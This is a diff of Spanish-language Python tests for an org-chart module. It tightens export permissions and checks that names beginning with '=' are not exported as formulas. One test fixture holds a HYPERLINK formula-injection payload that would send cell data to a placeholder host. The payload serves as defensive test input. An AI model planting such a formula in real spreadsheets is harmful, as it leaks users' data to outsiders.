@@ -179,7 +179,7 @@ def test_la_plantilla_trae_una_hoja_por_unidad_con_la_cadena_de_mando(db):
 
 def test_validar_no_guarda_y_confirmar_asigna_y_registra(db):
     c = _estructura()
-    _, admin = _cuenta("ines", "institucional.asignar")
+    _, admin = _cuenta("ines", "institucional.asignar", "institucional.ver_todo")
     rosa, _ = _cuenta("rosa")
     libro = _plantilla(admin)
     hoja = libro["Comercial"]
@@ -315,11 +315,18 @@ def test_no_es_un_xlsx_y_solo_quien_asigna_cargos(db):
     _, admin = _cuenta("ines", "institucional.asignar")
     _, otro = _cuenta("rosa", "institucional.ver")
     _, arma = _cuenta("ema", "institucional.editar")
+    _, arma_todo = _cuenta("eva", "institucional.editar", "institucional.ver_todo")
+    _, solo_todo = _cuenta("ana", "institucional.ver_todo")
     assert otro.get(PLANTILLA).status_code == 403
     assert otro.get(f"{BASE}organigrama/exportar/").status_code == 403
-    # Quien arma la estructura descarga los dos archivos, pero no carga.
+    # Quien arma la estructura descarga la plantilla, pero no carga. El
+    # organigrama completo, con nombres de todas las áreas, pide además ver
+    # todo el organigrama (12/11/2026); verlo todo sin armar ni asignar,
+    # tampoco basta.
     assert arma.get(PLANTILLA).status_code == 200
-    assert arma.get(f"{BASE}organigrama/exportar/").status_code == 200
+    assert arma.get(f"{BASE}organigrama/exportar/").status_code == 403
+    assert arma_todo.get(f"{BASE}organigrama/exportar/").status_code == 200
+    assert solo_todo.get(f"{BASE}organigrama/exportar/").status_code == 403
     assert arma.post(CARGA, {}, format="multipart").status_code == 403
     assert otro.post(CARGA, {}, format="multipart").status_code == 403
     falso = SimpleUploadedFile("organigrama.xlsx", b"no soy un excel")
@@ -336,7 +343,7 @@ def test_un_nombre_que_empieza_por_igual_no_baja_como_formula(db):
         c["analista"].nombre = '=HYPERLINK("http://x.test/?"&A1,"Ver")'
         c["analista"].save()
         OcupanteCargo.objects.create(cargo=c["analista"], nombres="=1+1", apellidos="-Mora")
-    _, admin = _cuenta("ines", "institucional.asignar")
+    _, admin = _cuenta("ines", "institucional.asignar", "institucional.ver_todo")
 
     for libro in (_plantilla(admin), _completo(admin)):
         _, filas = _filas(libro["Comercial"])
